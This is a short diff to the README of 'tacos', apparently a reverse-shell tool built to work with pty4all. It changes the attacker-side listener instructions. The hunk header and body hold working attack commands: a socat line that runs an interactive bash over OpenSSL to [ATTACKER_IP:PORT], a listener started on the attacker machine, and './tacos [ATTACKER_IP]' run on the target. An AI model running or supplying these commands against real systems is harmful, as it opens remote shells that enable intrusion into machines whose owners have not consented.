@@ -21,7 +21,8 @@ socat exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP:PORT],v
 `tacos` is built to work with the simple and dramatically effective project [`pty4all`](https://github.com/laluka/pty4all):
 ```shell
 # On attacker machine
-./socat-multi-handler.sh --lhost [ATTACKER_IP] --lport 443 --webport 80
+tmux
+./light-pty4all/socat-listener.sh --lport [ATTACKER_PORT]
 
 # On target (transfer tacos as you wish)
 ./tacos [ATTACKER_IP]
